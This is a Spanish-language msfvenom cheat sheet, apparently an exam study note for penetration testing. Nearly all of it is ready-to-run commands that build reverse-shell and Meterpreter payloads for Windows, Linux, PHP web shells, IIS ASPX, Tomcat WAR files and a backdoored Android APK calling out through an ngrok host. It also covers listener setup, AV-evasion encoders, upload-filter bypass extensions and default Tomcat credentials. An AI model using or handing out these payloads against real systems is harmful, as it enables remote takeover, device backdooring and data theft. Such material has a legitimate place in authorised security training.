# Msfvenom

Tags: #Msfvenom #Metasploit #Payloads #ReverseShell #Windows #Linux #PHP #WebDAV #Tomcat #Android

- [MsfVenom Payload Cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

## OBJETIVO

- Generar payloads maliciosos para diferentes plataformas y formatos
- Obtener reverse shells hacia Metasploit (Meterpreter) o Netcat
- Crear payloads para servicios específicos (WebDAV, Tomcat, PHP, etc.)

## TIPS

1. **Staged (/) vs Stageless (_) → staged requiere Metasploit | stageless funciona con netcat**
2. **x64 vs x86 → identificar arquitectura del objetivo antes de generar el payload**
3. **LHOST → siempre tu IP de tun0 en el examen**
4. **Puerto 443 → más probable que pase por firewall que otros puertos**
5. **Siempre poner netcat o Metasploit en escucha ANTES de ejecutar el payload en la víctima**

## Staged vs Stageless

```
windows/x64/meterpreter/reverse_tcp   → Staged   → / entre meterpreter y reverse
windows/x64/meterpreter_reverse_tcp   → Stageless → _ entre meterpreter y reverse
windows/x64/shell/reverse_tcp         → Staged    → necesita multi/handler
windows/x64/shell_reverse_tcp         → Stageless → funciona con nc -nlvp
```

## REFERENCIA DE FLAGS

```bash
-p   # Payload a usar
-f   # Formato del output (exe, elf, aspx, war, raw, etc.)
-o   # Archivo de output → si no se usa → redirigir con >
-a   # Arquitectura (x64, x86)
--platform  # Plataforma (windows, linux, android)
-e   # Encoder para ofuscación
-i   # Iteraciones del encoder
-b   # Badchars → bytes a evitar
LHOST  # IP del atacante
LPORT  # Puerto del atacante en escucha
```

---

## 1. WINDOWS PAYLOADS

### Stageless → recibir con netcat

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe
# x64 stageless → recibir con nc -nlvp 443

❯ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe
# x86 → para sistemas 32 bits

❯ msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=<IP> LPORT=443 -f exe -o shell.exe
# Especificando plataforma y arquitectura explícitamente
```

### Staged → recibir con Metasploit (Meterpreter)

```bash
❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
# x64 staged → requiere multi/handler con Meterpreter

❯ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
# x64 staged → shell básica vía Metasploit

❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o reverse.exe
# x64 stageless Meterpreter → más estable → recibir con multi/handler
```

### Recibir con Metasploit

```bash
❯ msfconsole -q
❯ use exploit/multi/handler
❯ set payload windows/x64/meterpreter/reverse_tcp
❯ set LHOST <IP>
❯ set LPORT 443
❯ run
# Cambiar el payload al mismo que usaste en msfvenom
```

---

## 2. LINUX PAYLOADS

```bash
❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
# x64 staged → Meterpreter → recibir con multi/handler

❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
# x64 stageless → recibir con nc -nlvp 443

❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
# x86 stageless → sistemas 32 bits

# En la víctima → dar permisos y ejecutar
❯ chmod +x shell.elf && ./shell.elf
```

---

## 3. PHP PAYLOAD

```bash
❯ msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > cmd.php
# Webshell PHP → subir a servidor web → acceder desde navegador

# Después de acceder desde el navegador → recibir con Metasploit
❯ msfconsole -q
❯ use exploit/multi/handler
❯ set payload php/meterpreter/reverse_tcp
❯ set LHOST <IP>
❯ set LPORT 4444
❯ run
```

### Insight

- Subir el cmd.php al servidor → acceder desde el navegador para activarlo
- Si el servidor filtra PHP → probar extensiones: .php5, .phtml, .phar

---

## 4. IIS — WEBDAV (ASPX / ASP)

```bash
# Stageless → recibir con netcat
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f aspx -o reverse.aspx
# Si la máquina es x86 → quitar x64: windows/shell_reverse_tcp

# Stageless Meterpreter → recibir con Metasploit multi/handler
❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o reverse.exe
# Transferir con python3 → descargar con certutil en la víctima

# ASP (IIS más antiguo)
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f asp > shell.asp
❯ msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=443 -f aspx > shell.aspx
```

### Insight

- ASPX → IIS moderno (Windows Server 2012+)
- ASP → IIS antiguo (Windows Server 2003/2008)
- Subir con cadaver o con WebDAV si tiene permisos de escritura

---

## 5. TOMCAT (WAR)

```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war -o reverse.war
# WAR → subir desde el panel de Tomcat Manager → /manager/html
# Recibir con nc -nlvp 443

❯ msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f war -o reverse.war
# Meterpreter → recibir con multi/handler
```

### Insight

- Subir el WAR desde Tomcat Manager → /manager/html → Deploy
- Acceder al WAR subido → http://IP:8080/reverse/ → activa la shell
- Credenciales por defecto de Tomcat → tomcat:tomcat, admin:admin, manager:manager

---

## 6. TELNET

```bash
❯ msfvenom -p cmd/unix/reverse_netcat LHOST=<IP> LPORT=4444 R
# R → output en formato raw

# Copiar el output (empieza con mkfifo) → pegarlo en la sesión de Telnet
# Recibir con: nc -nlvp 4444
```

---

## 7. ANDROID APK

```bash
❯ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14015 -o msf.apk
# LHOST → dominio de Ngrok | LPORT → puerto de Ngrok

❯ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14015 --platform android -a dalvik -f raw -o Backdoor.apk
# Especificando plataforma y arquitectura Dalvik

# Recibir con Metasploit
❯ msfconsole -q
❯ use exploit/multi/handler
❯ set payload android/meterpreter/reverse_tcp
❯ set LHOST 0.tcp.ngrok.io
❯ set LPORT 14015
❯ run
```

---

## 8. PAYLOADS CON ENCODER (EVASIÓN DE AV)

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -e x64/xor_dynamic -i 10 -o shell.exe
# -e → encoder | -i 10 → 10 iteraciones → más ofuscado

❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe
# shikata_ga_nai → encoder polimórfico → más efectivo en x86

❯ msfvenom --list encoders
# Ver todos los encoders disponibles
```

### Insight

- Los encoders básicos de msfvenom no evaden AV moderno por sí solos
- Para evasión real → usar técnicas adicionales (shellcode injection, etc.)
- En el examen el AV suele estar desactivado → no es prioridad

---

## ONE-LINERS MENTALES

- Windows x64 con netcat → shell_reverse_tcp + -f exe
- Windows x64 con Meterpreter → meterpreter/reverse_tcp + multi/handler
- PHP en servidor web → php/meterpreter + -f raw > cmd.php
- Tomcat → java/jsp_shell_reverse_tcp + -f war
- IIS/WebDAV → shell_reverse_tcp + -f aspx
- Staged (/) → multi/handler en Metasploit | Stageless (_) → nc -nlvp